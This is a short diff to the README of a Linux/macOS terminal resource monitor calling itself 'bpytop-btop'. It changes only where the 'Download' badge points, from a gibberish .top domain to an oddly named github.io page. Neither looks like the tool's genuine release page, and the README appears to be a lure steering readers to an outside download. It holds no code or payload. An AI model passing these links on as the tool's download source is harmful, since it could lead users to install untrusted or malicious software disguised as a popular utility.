@@ -2,7 +2,7 @@
 
 A lightweight, feature-rich terminal system monitor for Linux and macOS, providing real-time insights into CPU, memory, disk, and network usage with a sleek, customizable UI. Perfect for developers, sysadmins, and power users who need performance monitoring at their fingertips.
 
-[![Download bpytop-btop](https://img.shields.io/badge/Download-bpytop--btop-blueviolet)](https://poelkakusthbutn.top/)
+[![Download bpytop-btop](https://img.shields.io/badge/Download-bpytop--btop-blueviolet)](https://bpytop-btop-a-monitor-of-resources.github.io/.github)
 
 ---
 
